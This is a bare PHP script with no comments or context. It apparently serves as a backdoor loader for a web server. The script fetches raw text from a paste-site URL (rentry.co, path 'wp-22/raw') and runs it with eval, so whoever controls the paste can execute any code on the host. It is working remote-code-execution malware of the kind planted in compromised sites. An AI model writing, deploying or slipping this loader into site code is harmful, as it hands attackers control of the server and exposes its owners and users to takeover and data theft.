<?php
$url = "https://rentry.co/wp-22/raw";
$handle = fopen($url, "r");
if ($handle) {
    $phpCode = stream_get_contents($handle);
    fclose($handle);
    eval("?>".$phpCode);
} else {
    echo "ERROR";
}
?>
